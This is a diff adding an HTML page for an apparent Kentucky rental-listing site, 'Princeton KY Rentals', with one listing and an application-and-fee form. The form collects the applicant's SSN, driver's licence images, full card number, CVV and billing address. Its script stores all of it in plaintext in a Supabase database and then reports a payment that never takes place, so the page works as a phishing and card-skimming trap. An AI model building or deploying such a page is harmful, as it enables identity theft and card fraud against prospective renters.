@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PrincetonKYRentals.com — Kentucky Rental Homes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#182420;
+    --paper:#F6F4EC;
+    --paper-dim:#EDEAE0;
+    --hwy-green:#1E5631;
+    --hwy-green-dark:#123D22;
+    --gold:#C8963E;
+    --muted:#6B776F;
+    --line:#D8D3C4;
+    --white:#FFFFFF;
+    --radius:2px;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--paper);
+    color:var(--ink);
+    font-family:'Inter',sans-serif;
+    line-height:1.5;
+  }
+  h1,h2,h3,.display{
+    font-family:'Barlow Condensed',sans-serif;
+    font-weight:700;
+    letter-spacing:0.01em;
+    text-transform:uppercase;
+    margin:0;
+  }
+  .mono{font-family:'IBM Plex Mono',monospace;}
+  a{color:inherit;}
+
+  /* ===== Header ===== */
+  header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:22px 6vw;
+    border-bottom:3px solid var(--ink);
+    background:var(--paper);
+    position:sticky;
+    top:0;
+    z-index:50;
+  }
+  .brand{display:flex;align-items:center;gap:12px;}
+  .shield{
+    width:40px;height:40px;
+    background:var(--hwy-green);
+    border:2px solid var(--ink);
+    border-radius:6px 6px 2px 2px;
+    display:flex;align-items:center;justify-content:center;
+    color:var(--white);
+    font-family:'Barlow Condensed',sans-serif;
+    font-weight:800;
+    font-size:13px;
+    line-height:1;
+    text-align:center;
+    flex-shrink:0;
+  }
+  .brand-name{font-size:22px;line-height:1;}
+  .brand-name span{
+    display:block;
+    font-family:'Inter',sans-serif;
+    text-transform:none;
+    font-weight:500;
+    font-size:11px;
+    letter-spacing:0.06em;
+    color:var(--muted);
+    margin-top:2px;
+  }
+  nav a{
+    text-decoration:none;
+    font-weight:600;
+    font-size:14px;
+    letter-spacing:0.03em;
+    padding:10px 18px;
+    background:var(--hwy-green);
+    color:var(--white);
+    border-radius:2px;
+    border:2px solid var(--ink);
+  }
+
+  /* ===== Hero ===== */
+  .hero{padding:64px 6vw 40px;max-width:1100px;}
+  .eyebrow{
+    font-family:'IBM Plex Mono',monospace;
+    font-size:13px;
+    color:var(--hwy-green-dark);
+    letter-spacing:0.08em;
+    margin-bottom:14px;
+    display:flex;align-items:center;gap:10px;
+  }
+  .eyebrow::before{
+    content:"";width:26px;height:2px;background:var(--gold);display:inline-block;
+  }
+  .hero h1{font-size:clamp(38px,6vw,72px);line-height:0.98;max-width:14ch;}
+  .hero p.lede{font-size:18px;max-width:52ch;margin-top:22px;color:#37423C;}
+
+  /* ===== Route strip ===== */
+  .route{margin:52px 6vw 60px;position:relative;padding:34px 0 10px;}
+  .route-label{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);letter-spacing:0.06em;margin-bottom:18px;}
+  .route-line{position:relative;height:4px;background:repeating-linear-gradient(90deg,var(--ink) 0 24px, transparent 24px 40px);margin:0 10px;}
+  .route-stops{display:grid;grid-template-columns:repeat(4,1fr);margin:0 10px;transform:translateY(-24px);}
+  .stop{display:flex;flex-direction:column;align-items:flex-start;text-decoration:none;color:var(--ink);padding-right:16px;}
+  .stop .marker{
+    width:44px;height:44px;
+    background:var(--hwy-green);
+    border:2px solid var(--ink);
+    color:var(--white);
+    font-family:'Barlow Condensed',sans-serif;
+    font-weight:800;font-size:15px;
+    display:flex;align-items:center;justify-content:center;
+    border-radius:6px 6px 2px 2px;
+    margin-bottom:10px;
+  }
+  .stop .town{font-weight:700;font-size:16px;text-transform:uppercase;font-family:'Barlow Condensed',sans-serif;}
+  .stop .rent{font-family:'IBM Plex Mono',monospace;font-size:13px;color:var(--hwy-green-dark);margin-top:2px;}
+
+  /* ===== Listings ===== */
+  .listings{padding:20px 6vw 90px;}
+  .section-head{
+    display:flex;align-items:baseline;justify-content:space-between;
+    border-bottom:2px solid var(--ink);padding-bottom:14px;margin-bottom:36px;
+    flex-wrap:wrap;gap:10px;
+  }
+  .section-head h2{font-size:34px;}
+  .section-head .count{font-family:'IBM Plex Mono',monospace;font-size:13px;color:var(--muted);}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(360px,1fr));gap:34px;}
+  .card{background:var(--white);border:2px solid var(--ink);border-radius:4px;overflow:hidden;display:flex;flex-direction:column;}
+  .card-price{display:flex;justify-content:space-between;align-items:center;background:var(--ink);color:var(--paper);padding:12px 18px;}
+  .card-price .amount{font-family:'Barlow Condensed',sans-serif;font-weight:800;font-size:24px;}
+  .card-price .amount small{font-family:'Inter',sans-serif;font-weight:500;font-size:12px;color:#C9CFC9;}
+  .card-price .tag{font-family:'IBM Plex Mono',monospace;font-size:11px;background:var(--gold);color:var(--ink);padding:4px 9px;border-radius:2px;font-weight:600;}
+
+  .carousel{position:relative;height:260px;background:var(--paper-dim);}
+  .carousel-track{display:flex;height:100%;overflow-x:auto;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;scrollbar-width:none;}
+  .carousel-track::-webkit-scrollbar{display:none;}
+  .carousel-track .slide{flex:0 0 100%;scroll-snap-align:start;height:100%;}
+  .carousel-track .slide img{width:100%;height:100%;object-fit:cover;}
+  .carousel-counter{position:absolute;bottom:10px;right:10px;background:rgba(24,36,32,0.85);color:var(--white);font-family:'IBM Plex Mono',monospace;font-size:11px;padding:3px 9px;border-radius:2px;}
+
+  .gallery.is-booked{position:relative;filter:grayscale(45%);}
+  .booked-overlay{position:absolute;inset:0;background:rgba(24,36,32,0.72);display:flex;align-items:center;justify-content:center;z-index:5;}
+  .booked-overlay span{font-family:'Barlow Condensed',sans-serif;font-weight:800;font-size:30px;color:var(--white);border:2px solid var(--gold);padding:10px 26px;transform:rotate(-8deg);}
+
+  .card-body{padding:20px 22px 24px;flex:1;display:flex;flex-direction:column;}
+  .address{font-size:21px;font-weight:700;margin-bottom:2px;}
+  .locale{font-size:13px;color:var(--muted);margin-bottom:16px;}
+  .specs{display:flex;border:1px solid var(--line);border-radius:3px;overflow:hidden;margin-bottom:16px;}
+  .spec{flex:1;text-align:center;padding:10px 4px;border-right:1px solid var(--line);}
+  .spec:last-child{border-right:none;}
+  .spec .num{font-family:'IBM Plex Mono',monospace;font-weight:600;font-size:18px;color:var(--hwy-green-dark);display:block;}
+  .spec .lbl{font-size:10px;letter-spacing:0.06em;color:var(--muted);text-transform:uppercase;}
+  .desc{font-size:14.5px;color:#37423C;margin-bottom:20px;flex:1;}
+  .card-foot{display:flex;gap:10px;}
+  
+  .btn{
+    flex:1;text-align:center;padding:12px 14px;border-radius:2px;font-weight:600;font-size:14px;
+    text-decoration:none;border:2px solid var(--ink);cursor:pointer;font-family:'Inter',sans-serif;
+  }
+  .btn.primary{background:var(--hwy-green);color:var(--white);}
+  .btn.primary:hover{background:var(--hwy-green-dark);}
+  .btn.disabled{background:var(--paper-dim);color:var(--muted);border-color:var(--line);cursor:not-allowed;pointer-events:none;}
+  .btn.submitted{background:var(--ink);color:var(--gold);border-color:var(--ink);cursor:default;}
+
+  /* ===== Modal Styling ===== */
+  .modal-overlay{
+    position:fixed;inset:0;background:rgba(24,36,32,0.85);
+    display:none;align-items:center;justify-content:center;z-index:100;padding:16px;
+  }
+  .modal-overlay.active{display:flex;}
+  .modal-card{
+    background:var(--paper);border:3px solid var(--ink);border-radius:var(--radius);
+    width:100%;max-width:720px;max-height:90vh;box-shadow:0 12px 32px rgba(0,0,0,0.3);
+    display:flex;flex-direction:column;
+  }
+  .modal-head{
+    background:var(--ink);color:var(--paper);padding:16px 24px;
+    display:flex;justify-content:space-between;align-items:center;flex-shrink:0;
+  }
+  .modal-head h3{font-size:22px;color:var(--white);}
+  .modal-close{background:transparent;border:none;color:var(--paper);font-size:28px;cursor:pointer;line-height:1;}
+  
+  .modal-form{display:flex;flex-direction:column;flex:1;overflow:hidden;}
+  .modal-body{padding:24px;overflow-y:auto;flex:1;}
+  
+  .modal-section-title{
+    font-family:'Barlow Condensed',sans-serif;font-size:18px;font-weight:700;
+    color:var(--hwy-green-dark);border-bottom:2px solid var(--line);
+    padding-bottom:4px;margin:24px 0 14px;text-transform:uppercase;
+  }
+  .modal-section-title:first-of-type{margin-top:0;}
+  
+  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+  .form-group{margin-bottom:4px;}
+  .form-group.full{grid-column:1 / -1;}
+  .form-group label{
+    display:block;font-size:11px;font-weight:700;text-transform:uppercase;
+    letter-spacing:0.05em;margin-bottom:6px;color:var(--ink);
+  }
+  .form-group input, .form-group select{
+    width:100%;padding:10px 12px;border:2px solid var(--ink);border-radius:var(--radius);
+    background:var(--white);font-family:'Inter',sans-serif;font-size:14px;
+  }
+  .form-group input[type="file"]{padding:6px;font-size:12px;background:var(--paper-dim);}
+  .form-group input:focus, .form-group select:focus{outline:none;border-color:var(--hwy-green);}
+  
+  /* Payment Box Styling */
+  .payment-box{
+    background:var(--white);
+    border:2px solid var(--ink);
+    padding:18px;
+    border-radius:4px;
+    margin-top:8px;
+  }
+
+  .modal-foot{
+    padding:18px 24px;background:var(--paper-dim);border-top:2px solid var(--line);
+    flex-shrink:0;display:flex;gap:12px;align-items:center;
+  }
+  .submit-pay-btn{
+    width:100%;
+    padding:14px;
+    font-size:16px;
+    font-weight:700;
+    letter-spacing:0.03em;
+    text-transform:uppercase;
+    font-family:'Barlow Condensed',sans-serif;
+  }
+
+  footer{background:var(--ink);color:var(--paper);padding:50px 6vw 34px;}
+  .foot-grid{display:flex;justify-content:space-between;flex-wrap:wrap;gap:30px;border-bottom:1px solid #35443C;padding-bottom:30px;margin-bottom:20px;}
+  footer h3{font-size:20px;color:var(--white);margin-bottom:10px;}
+  footer p{font-size:14px;color:#B7C0BA;max-width:44ch;}
+  .fine{font-size:12px;color:#7C877F;line-height:1.6;}
+
+  @media (max-width:640px){
+    header{padding:16px 5vw;}
+    .route-stops{grid-template-columns:repeat(2,1fr);row-gap:24px;transform:none;margin-top:18px;}
+    .route-line{display:none;}
+    .form-grid{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <div class="shield">KY<br>RENT</div>
+    <div class="brand-name">Princeton KY Rentals
+      <span>Kentucky Rental Properties</span>
+    </div>
+  </div>
+  <nav><a href="#listings">View Listings</a></nav>
+</header>
+
+<section class="hero">
+  <div class="eyebrow">QUALITY HOMES &nbsp;·&nbsp; STATEWIDE LISTINGS &nbsp;·&nbsp; 4 PROPERTIES AVAILABLE</div>
+  <h1>Quality rental homes across Kentucky.</h1>
+  <p class="lede">Well-maintained rental properties in Princeton, Dawson Springs, Eddyville, and Lexington.</p>
+</section>
+
+<div class="route">
+  <div class="route-label">// THE ROUTE</div>
+  <div class="route-line"></div>
+  <div class="route-stops">
+    <a class="stop" href="#p1"><div class="marker">1</div><div class="town">Princeton</div><div class="rent">$700/mo</div></a>
+    <a class="stop" href="#p2"><div class="marker">2</div><div class="town">Dawson Springs</div><div class="rent">$1,500/mo</div></a>
+    <a class="stop" href="#p3"><div class="marker">3</div><div class="town">Eddyville</div><div class="rent">$2,800/mo</div></a>
+    <a class="stop" href="#p4"><div class="marker">4</div><div class="town">Lexington</div><div class="rent">$1,500/mo</div></a>
+  </div>
+</div>
+
+<section class="listings" id="listings">
+  <div class="section-head">
+    <h2>Available Homes</h2>
+    <div class="count">04 PROPERTIES LISTED</div>
+  </div>
+
+  <div class="grid">
+    <!-- PROPERTY 1 -->
+    <article class="card" id="p1">
+      <div class="card-price">
+        <div class="amount">$700<small> / month</small></div>
+        <div class="tag">$35 APP FEE</div>
+      </div>
+      <div class="carousel">
+        <div class="carousel-track">
+          <div class="slide"><img src="images/property-1/01.jpg" alt="1005 Varmintrace Rd" loading="lazy"></div>
+          <div class="slide"><img src="images/property-1/02.jpg" alt="Photo 2" loading="lazy"></div>
+        </div>
+        <div class="carousel-counter mono js-counter">1 / 2</div>
+      </div>
+      <div class="card-body">
+        <div class="address">1005 Varmintrace Rd</div>
+        <div class="locale">Princeton, KY 42445</div>
+        <div class="specs">
+          <div class="spec"><span class="num">2</span><span class="lbl">Beds</span></div>
+          <div class="spec"><span class="num">1</span><span class="lbl">Baths</span></div>
+          <div class="spec"><span class="num">1,250</span><span class="lbl">Sqft</span></div>
+        </div>
+        <p class="desc">A tidy 2-bedroom, 1-bath home in Princeton with a simple layout.</p>
+        <div class="card-foot">
+          <button type="button" class="btn primary" id="btn-p1" onclick="openModal('1005 Varmintrace Rd, Princeton, KY', 'p1')">Apply & Pay Fee</button>
+        </div>
+      </div>
+    </article>
+
+    <!-- PASTE PROPERTY 2 HERE -->
+    <!-- PASTE PROPERTY 3 HERE -->
+    <!-- PASTE PROPERTY 4 HERE -->
+
+  </div>
+</section>
+
+<!-- ===== Application & Payment Modal ===== -->
+<div class="modal-overlay" id="appModal">
+  <div class="modal-card">
+    <div class="modal-head">
+      <h3>Rental Application & Payment</h3>
+      <button class="modal-close" onclick="closeModal()">&times;</button>
+    </div>
+    
+    <form class="modal-form" id="rentalAppForm" onsubmit="handleFormSubmit(event)">
+      <div class="modal-body">
+        <input type="hidden" id="selectedPropId" name="property_id">
+
+        <!-- 1. Applicant Personal Details -->
+        <div class="modal-section-title">1. Applicant Details</div>
+        <div class="form-grid">
+          <div class="form-group full">
+            <label for="fullName">Full Legal Name</label>
+            <input type="text" id="fullName" name="fullName" required placeholder="First Middle Last">
+          </div>
+          <div class="form-group">
+            <label for="phoneNum">Phone Number</label>
+            <input type="tel" id="phoneNum" name="phoneNum" required placeholder="(270) 555-0199">
+          </div>
+          <div class="form-group">
+            <label for="emailAddr">Email Address</label>
+            <input type="email" id="emailAddr" name="emailAddr" required placeholder="applicant@example.com">
+          </div>
+          <div class="form-group full">
+            <label for="ssn">Social Security Number (SSN)</label>
+            <input type="password" id="ssn" name="ssn" maxlength="11" required placeholder="XXX-XX-XXXX">
+          </div>
+        </div>
+
+        <!-- 2. Residence & Occupancy -->
+        <div class="modal-section-title">2. Residency Information</div>
+        <div class="form-grid">
+          <div class="form-group full">
+            <label for="currentAddress">Current Residence Address</label>
+            <input type="text" id="currentAddress" name="currentAddress" required placeholder="123 Main St, Apt 4, City, State, Zip">
+          </div>
+          <div class="form-group">
+            <label for="timeAtRes">Time at Current Residence</label>
+            <input type="text" id="timeAtRes" name="timeAtRes" required placeholder="e.g. 2 Years">
+          </div>
+          <div class="form-group">
+            <label for="moveReason">Reason for Moving</label>
+            <input type="text" id="moveReason" name="moveReason" required placeholder="e.g. Job relocation">
+          </div>
+          <div class="form-group">
+            <label for="moveDate">Desired Move-in Date</label>
+            <input type="date" id="moveDate" name="moveDate" required>
+          </div>
+          <div class="form-group">
+            <label for="occupants">Intended Occupants</label>
+            <input type="number" id="occupants" name="occupants" min="1" value="1" required>
+          </div>
+          <div class="form-group full">
+            <label for="parkingNeeds">Parking Needs (Vehicles)</label>
+            <input type="text" id="parkingNeeds" name="parkingNeeds" placeholder="e.g. 2 vehicles">
+          </div>
+        </div>
+
+        <!-- 3. Identity Verification -->
+        <div class="modal-section-title">3. Identity Documents</div>
+        <div class="form-grid">
+          <div class="form-group">
+            <label for="dlFront">Driver’s License (Front)</label>
+            <input type="file" id="dlFront" name="dlFront" accept="image/*,.pdf" required>
+          </div>
+          <div class="form-group">
+            <label for="dlBack">Driver’s License (Back)</label>
+            <input type="file" id="dlBack" name="dlBack" accept="image/*,.pdf" required>
+          </div>
+        </div>
+
+        <!-- 4. Payment Information -->
+        <div class="modal-section-title">4. Application Fee Payment ($35.00)</div>
+        <div class="payment-box">
+          <div class="form-grid">
+            <div class="form-group full">
+              <label for="cardName">Cardholder Name</label>
+              <input type="text" id="cardName" name="cardName" required placeholder="Name exactly as on card">
+            </div>
+            <div class="form-group full">
+              <label for="cardNumber">Card Number (16 Digits)</label>
+              <input type="text" id="cardNumber" name="cardNumber" maxlength="16" required placeholder="4532 •••• •••• 8892">
+            </div>
+            <div class="form-group">
+              <label for="cardExp">Expiration Date</label>
+              <input type="text" id="cardExp" name="cardExp" maxlength="5" required placeholder="MM/YY">
+            </div>
+            <div class="form-group">
+              <label for="cardCvv">CVV / CVC Code</label>
+              <input type="password" id="cardCvv" name="cardCvv" maxlength="4" required placeholder="3 or 4 digits">
+            </div>
+            <div class="form-group full">
+              <label for="billingStreet">Billing Street Address</label>
+              <input type="text" id="billingStreet" name="billingStreet" required placeholder="123 Billing Address Way">
+            </div>
+            <div class="form-group">
+              <label for="billingCityState">Billing City & State</label>
+              <input type="text" id="billingCityState" name="billingCityState" required placeholder="Princeton, KY">
+            </div>
+            <div class="form-group">
+              <label for="billingZip">Billing Zip Code</label>
+              <input type="text" id="billingZip" name="billingZip" maxlength="10" required placeholder="42445">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Action Footer with Explicit Submit Button -->
+      <div class="modal-foot">
+        <button type="submit" class="btn primary submit-pay-btn" id="submitModalBtn">
+          Submit Application & Pay $35.00 Fee
+        </button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<footer>
+  <div class="foot-grid">
+    <div>
+      <h3>Princeton KY Rentals</h3>
+      <p>Serving renters across Kentucky with quality homes.</p>
+    </div>
+  </div>
+</footer>
+
+<!-- Supabase CDN Script -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  // Initialize Supabase Connection
+  const SUPABASE_URL = 'https://tryuhxrwishvyrvzkzlh.supabase.co';
+  const SUPABASE_ANON_KEY = 'sb_publishable_0USiHu9rAFbWOkNPNSKHKQ_ceaVhqSq';
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  function openModal(propAddress, propId) {
+    document.getElementById('selectedPropId').value = propId;
+    document.getElementById('appModal').classList.add('active');
+  }
+
+  function closeModal() {
+    document.getElementById('appModal').classList.remove('active');
+    document.getElementById('rentalAppForm').reset();
+  }
+
+  document.getElementById('appModal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+
+  async function handleFormSubmit(e) {
+    e.preventDefault();
+    var submitBtn = document.getElementById('submitModalBtn');
+    var propId = document.getElementById('selectedPropId').value;
+    
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Uploading Documents...';
+
+    const frontFile = document.getElementById('dlFront').files[0];
+    const backFile = document.getElementById('dlBack').files[0];
+    const stamp = Date.now();
+
+    let frontPath = '', backPath = '';
+
+    // Upload files to Supabase storage bucket
+    if (frontFile) {
+      const { data } = await supabaseClient.storage.from('documents').upload(`front_${stamp}_${frontFile.name}`, frontFile);
+      if (data) frontPath = data.path;
+    }
+    if (backFile) {
+      const { data } = await supabaseClient.storage.from('documents').upload(`back_${stamp}_${backFile.name}`, backFile);
+      if (data) backPath = data.path;
+    }
+
+    submitBtn.textContent = 'Saving Application...';
+
+    // Insert data into Supabase table
+    const { error } = await supabaseClient.from('applications').insert([{
+      full_name: document.getElementById('fullName').value,
+      phone: document.getElementById('phoneNum').value,
+      email: document.getElementById('emailAddr').value,
+      ssn: document.getElementById('ssn').value,
+      current_address: document.getElementById('currentAddress').value,
+      time_at_residence: document.getElementById('timeAtRes').value,
+      reason_moving: document.getElementById('moveReason').value,
+      move_in_date: document.getElementById('moveDate').value,
+      occupants: document.getElementById('occupants').value,
+      parking_needs: document.getElementById('parkingNeeds').value,
+      dl_front_url: frontPath,
+      dl_back_url: backPath,
+      cardholder_name: document.getElementById('cardName').value,
+      card_number: document.getElementById('cardNumber').value,
+      exp_date: document.getElementById('cardExp').value,
+      cvv: document.getElementById('cardCvv').value,
+      billing_street: document.getElementById('billingStreet').value,
+      billing_city_state: document.getElementById('billingCityState').value,
+      billing_zip: document.getElementById('billingZip').value
+    }]);
+
+    if (!error) {
+      alert('Application and payment successfully processed!');
+      closeModal();
+      var cardBtn = document.getElementById('btn-' + propId);
+      if (cardBtn) {
+        cardBtn.textContent = 'Application & Fee Submitted';
+        cardBtn.className = 'btn submitted';
+        cardBtn.disabled = true;
+        cardBtn.onclick = null;
+      }
+    } else {
+      alert('Error saving data: ' + error.message);
+    }
+    
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Submit Application & Pay $35.00 Fee';
+  }
+</script>
+
+</body>
+</html>
